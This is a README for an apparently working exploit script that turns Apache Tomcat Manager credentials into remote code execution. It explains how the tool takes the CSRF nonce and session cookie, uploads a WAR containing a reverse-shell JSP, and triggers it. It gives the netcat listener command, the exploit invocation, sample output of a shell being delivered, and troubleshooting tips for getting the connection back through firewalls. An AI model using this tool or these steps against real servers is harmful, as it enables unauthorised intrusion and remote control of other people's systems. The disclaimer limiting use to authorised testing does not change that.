# Tomcat Manager Authenticated WAR Upload RCE

Authenticated WAR upload to remote code execution on Apache Tomcat, through the
Manager application's HTML upload form.

## How it works

The Manager app lets a `manager-gui` account upload a WAR through
`/manager/html/upload`. Tomcat unpacks it and serves whatever is inside under a
context named after the file. Put a JSP that opens a reverse shell in the archive,
request it once, and the code runs as the Tomcat user.

Since Tomcat 7 the upload form is guarded by a CSRF nonce tied to the session
cookie. The nonce on its own is useless; you need the nonce and the matching
`JSESSIONID` together. The script pulls both from `/manager/html` in one request
and reuses them for the upload.

The WAR is built in memory from a single JSP, so there is no msfvenom dependency.
The shell checks `os.name` and spawns `cmd.exe` on Windows or `/bin/sh` elsewhere,
so the same archive works against either.

## Usage

Start a listener:

```
nc -lvnp 4444
```

Run it:

```
python3 exploit.py -t <host:port> -u <user> -p <pass> -L <lhost> -P <lport>
```

```
$ python3 exploit.py -t 172.16.1.11 -u tomcat -p Tomcatadm -L 172.16.1.5 -P 4444
[+] Fetching CSRF nonce from http://172.16.1.11:8080/manager/html
[+] Nonce: C7B382FA6FA40AE3577B7137A0574880
[+] Uploading 812 bytes as kqxbneltra.war
[+] Deployed to context /kqxbneltra
[+] Triggering http://172.16.1.11:8080/kqxbneltra/dpmhlwosnc.jsp
[+] If your listener is up, the shell lands now.
[+] Undeploying /kqxbneltra
[+] Done.
```

The context and JSP names are random each run. By default the app is undeployed
once the shell fires; pass `--no-cleanup` to leave it. `-L` is the address the
target connects back to, which on a VPN'd lab is your `tun0` address, not `eth0`.

The target port defaults to 8080, Tomcat's usual port. Pass `-r` for a different
one, or put the port straight in `-t` (`-t host:9090`); a port in `-t` wins over
`-r`. A bare `-t host` with Tomcat on a non-default port is what produces a 404
on the manager page.

### Options

- `-t, --target` — host, `host:port`, or a full URL.
- `-r, --rport` — target port, default 8080. Ignored if `-t` names a port or scheme.
- `-u, --user` / `-p, --password` — manager credentials.
- `-L, --lhost` / `-P, --lport` — where the reverse shell connects.
- `--manager-path` — manager base path, default `/manager`.
- `--ssl` — use https when the target has no scheme.
- `--no-cleanup` — leave the app deployed.

## Requirements

Python 3 and `requests`.

## When it does not work

- 404 on the manager page usually means the wrong port. Tomcat is rarely on 80;
  pass `-r 8080` (the default) or whatever port it actually listens on.
- 401 on the manager page means the credentials are wrong.
- 403 means the account exists but lacks `manager-gui`. A `manager-script`-only
  account cannot reach the HTML upload form; deploy through `/manager/text`
  instead, which this script does not cover.
- Upload returns 200 but no shell: the payload deployed but could not call home.
  Check that `-L` is the interface the target can actually reach, and that no
  egress filtering blocks the port. A bind or HTTP-based payload is the fallback.
- No nonce in the page: very old Tomcat without CSRF protection. The script
  detects this and uploads without one.

## Licence

MIT, see [LICENSE](LICENSE).

## Legal

For authorised testing and research only. Running this against a system you do
not own or have written permission to test is illegal in most places.
